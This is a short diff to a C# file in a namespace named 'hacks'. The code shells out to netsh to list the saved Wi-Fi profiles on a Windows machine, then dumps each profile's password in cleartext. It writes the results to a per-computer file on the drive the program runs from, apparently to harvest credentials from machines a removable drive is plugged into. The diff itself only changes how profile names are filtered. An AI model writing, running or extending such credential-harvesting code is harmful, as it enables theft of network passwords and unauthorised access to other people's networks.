@@ -16,14 +16,14 @@ namespace console_of_all_functions.libraries.hacks
         {
             try
             {
-                string createWifiFile = "/c netsh wlan show profiles & find \"" + "Todos" + "\">wifiNames.txt";
+                string createWifiFile = "/c netsh wlan show profiles>wifiNames.txt";
                 System.Diagnostics.Process.Start("CMD.exe", createWifiFile);
                 var lines = File.ReadAllLines("wifiNames.txt", Encoding.UTF8);
                 string device = Directory.GetCurrentDirectory().Substring(0, 2);
                 string computer = Environment.MachineName;
                 var output = File.CreateText(device + "\\Data\\" + computer + "\\wifiPasswords.txt");
 
-                foreach (var line in lines)
+                foreach (var line in lines.Where(x=>x.Contains("Todos")||x.Contains("All")))
                 {
                     string wifiName = line.Split(':')[1];
                     string getWifiPassword = "/c netsh wlan show profile " + wifiName + " key=clear>wifiInfo.txt";
